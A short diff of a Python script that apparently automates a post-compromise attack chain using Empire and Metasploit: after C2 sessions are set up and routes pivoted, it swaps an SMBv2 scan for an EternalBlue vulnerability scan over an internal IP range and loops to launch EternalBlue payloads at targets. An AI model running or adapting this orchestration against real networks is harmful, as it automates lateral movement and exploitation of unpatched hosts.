@@ -13,7 +13,7 @@ from c2_settings import *
 from EmpireAPIWrapper import empireAPI
 from pymetasploit.msfrpc import MsfRpcClient
 from stage2.external_c2 import msf_wait_for_session, empire_wait_for_agent
-from stage3.internal_reconn.windows import msf_ifconfig, msf_smbv2_scan
+from stage3.internal_reconn.windows import msf_ifconfig, msf_eternalblue_scan
 from stage3.internal_c2.windows import msf_autoroute
 from stage3.escalate_privilege.windows import msf_eternal_blue
 
@@ -42,8 +42,8 @@ for r in routes:
         pivot_range = r.replace('.0/255.255.255.0','.190-200') 
 
 # Step 4 - Scan for targets
-print('Scanning SMBv2 for this range ' + pivot_range)
-targets = msf_smbv2_scan.run(client, pivot_range)
+print('Scanning for vulnerable targets within pivot range ' + pivot_range)
+targets = msf_eternalblue_scan.run(client, pivot_range)
 
 # Step 5 - Launch EB payload via pivot to target
 for target_address in targets:
